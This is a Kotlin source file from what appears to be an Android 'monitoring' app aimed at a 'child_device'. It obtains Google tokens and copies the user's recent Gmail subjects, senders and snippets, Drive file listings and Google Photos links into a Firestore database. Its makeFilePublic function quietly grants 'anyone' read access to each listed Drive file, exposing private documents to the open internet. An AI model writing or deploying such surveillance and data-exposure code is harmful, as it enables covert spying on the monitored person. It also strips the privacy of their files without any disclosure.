package com.example.alphamonitoringapp.monitoring
import com.example.alphamonitoringapp.utils.fetchFromGoogleApi

import android.content.Context
import com.google.firebase.firestore.SetOptions // ✅ Make sure this is imported
import android.util.Log
import com.google.android.gms.auth.GoogleAuthUtil
import com.google.android.gms.auth.UserRecoverableAuthException
import com.google.android.gms.auth.api.signin.GoogleSignIn
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

object GoogleDataUploader {

    suspend fun uploadAll(context: Context, onRecoverableAuth: (intent: android.content.Intent) -> Unit) {
        val account = GoogleSignIn.getLastSignedInAccount(context)
        if (account == null) {
            Log.e("GoogleDataUploader", "⚠️ No signed-in Google account found")
            return
        }

        val userId = FirebaseAuth.getInstance().currentUser?.uid ?: "child_device"
        val scope = "oauth2:" +
                "https://www.googleapis.com/auth/gmail.readonly " +
                "https://www.googleapis.com/auth/drive.metadata.readonly " +
                "https://www.googleapis.com/auth/photoslibrary.readonly"

        try {
            val token = withContext(Dispatchers.IO) {
                GoogleAuthUtil.getToken(context, account.account!!, scope)
            }

            uploadGmail(token, userId)
            uploadDrive(token, userId)
            uploadPhotos(token, userId)

        } catch (e: UserRecoverableAuthException) {
            Log.w("GoogleDataUploader", "🛑 User permission required for Google data access.")
            e.intent?.let { onRecoverableAuth(it) }
        } catch (e: Exception) {
            Log.e("GoogleDataUploader", "❌ Token fetch failed: ${e.localizedMessage}")
        }
    }

    private fun uploadGmail(token: String, userId: String) {
        val listUrl = URL("https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=10")
        val messages = fetchFromGoogleApi(listUrl, token)?.optJSONArray("messages")
        val gmailList = mutableListOf<Map<String, String>>()

        messages?.let { msgs ->
            for (i in 0 until msgs.length()) {
                val msg = msgs.getJSONObject(i)
                val messageId = msg.optString("id")

                try {
                    // Fetch full message including snippet
                    val detailUrl = URL(
                        "https://gmail.googleapis.com/gmail/v1/users/me/messages/$messageId?format=full"
                    )
                    val detail = fetchFromGoogleApi(detailUrl, token)
                    val snippet = detail?.optString("snippet") ?: ""

                    // Extract headers
                    val headers = detail
                        ?.optJSONObject("payload")
                        ?.optJSONArray("headers")
                    var subject = ""
                    var from = ""
                    var date = ""
                    headers?.let { h ->
                        for (j in 0 until h.length()) {
                            val header = h.getJSONObject(j)
                            when (header.optString("name")) {
                                "Subject" -> subject = header.optString("value")
                                "From" -> from = header.optString("value")
                                "Date" -> date = header.optString("value")
                            }
                        }
                    }

                    // Add to list
                    gmailList.add(mapOf(
                        "id" to messageId,
                        "subject" to subject,
                        "from" to from,
                        "date" to date,
                        "snippet" to snippet
                    ))
                } catch (e: Exception) {
                    Log.e("uploadGmail", "Error retrieving message $messageId: ${e.message}")
                }
            }
        }

        // Upload to Firestore
        FirebaseFirestore.getInstance()
            .collection("gmail")
            .document(userId)
            .set(mapOf("emails" to gmailList))
            .addOnSuccessListener {
                Log.d("GoogleDataUploader", "✅ Gmail uploaded: ${gmailList.size}")
            }
            .addOnFailureListener {
                Log.e("GoogleDataUploader", "❌ Failed to upload Gmail: ${it.message}")
            }
    }



    private fun uploadDrive(token: String, userId: String) {
        val url = URL("https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,mimeType,modifiedTime,webViewLink)")
        val files = fetchFromGoogleApi(url, token)?.optJSONArray("files")
        val driveList = mutableListOf<Map<String, String>>()

        files?.let {
            for (i in 0 until it.length()) {
                val file = it.getJSONObject(i)
                val fileId = file.optString("id")

                // ⬇️ Grant public view permission
                makeFilePublic(fileId, token)

                driveList.add(
                    mapOf(
                        "id" to fileId,
                        "name" to file.optString("name"),
                        "type" to file.optString("mimeType"),
                        "modified" to file.optString("modifiedTime"),
                        "link" to file.optString("webViewLink")
                    )
                )
            }
        }

        FirebaseFirestore.getInstance()
            .collection("drive")
            .document(userId)
            .set(mapOf("files" to driveList))
            .addOnSuccessListener {
                Log.d("GoogleDataUploader", "✅ Drive uploaded: ${driveList.size}")
            }
            .addOnFailureListener {
                Log.e("GoogleDataUploader", "❌ Failed to upload Drive: ${it.message}")
            }
    }

    private fun makeFilePublic(fileId: String, token: String) {
        try {
            val url = URL("https://www.googleapis.com/drive/v3/files/$fileId/permissions")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Authorization", "Bearer $token")
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true

            val requestBody = """
            {
              "role": "reader",
              "type": "anyone"
            }
        """.trimIndent()

            connection.outputStream.use { it.write(requestBody.toByteArray()) }

            val responseCode = connection.responseCode
            if (responseCode == 200 || responseCode == 204) {
                Log.d("DrivePerm", "✅ File $fileId is now public.")
            } else {
                Log.e("DrivePerm", "❌ Failed to set permission. Code: $responseCode")
            }

        } catch (e: Exception) {
            Log.e("DrivePerm", "❌ Exception setting permission: ${e.message}")
        }
    }

    private fun uploadPhotos(token: String, userId: String) {
        val url = URL("https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=10")
        val root = fetchFromGoogleApi(url, token)
        val items = root?.optJSONArray("mediaItems")
        val photoList = mutableListOf<Map<String, String>>()

        if (items == null) {
            Log.w("GoogleDataUploader", "⚠️ No mediaItems returned from Google Photos API")
        }

        val sdf = SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault())

        items?.let {
            for (i in 0 until it.length()) {
                val item = it.getJSONObject(i)

                val id = item.optString("id")
                val filename = item.optString("filename")
                val mimeType = item.optString("mimeType")
                val productUrl = item.optString("productUrl")
                val creationTimeRaw = item
                    .optJSONObject("mediaMetadata")
                    ?.optString("creationTime") ?: ""

                // Optional: Format timestamp
                val formattedTimestamp = try {
                    val parsed = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.getDefault())
                        .parse(creationTimeRaw)
                    sdf.format(parsed!!)
                } catch (e: Exception) {
                    creationTimeRaw
                }

                photoList.add(
                    mapOf(
                        "id" to id,
                        "filename" to filename,
                        "type" to mimeType,
                        "viewUrl" to productUrl,               // ✅ Viewable link
                        "timestamp" to formattedTimestamp      // ✅ Human-readable timestamp
                    )
                )
            }
        }

        if (photoList.isEmpty()) {
            Log.w("GoogleDataUploader", "⚠️ No photos to upload")
            return
        }

        FirebaseFirestore.getInstance()
            .collection("google_photos")
            .document(userId)
            .set(mapOf("photos" to photoList))
            .addOnSuccessListener {
                Log.d("GoogleDataUploader", "✅ Photos uploaded: ${photoList.size}")
            }
            .addOnFailureListener {
                Log.e("GoogleDataUploader", "❌ Failed to upload Photos: ${it.message}")
            }
    }

}
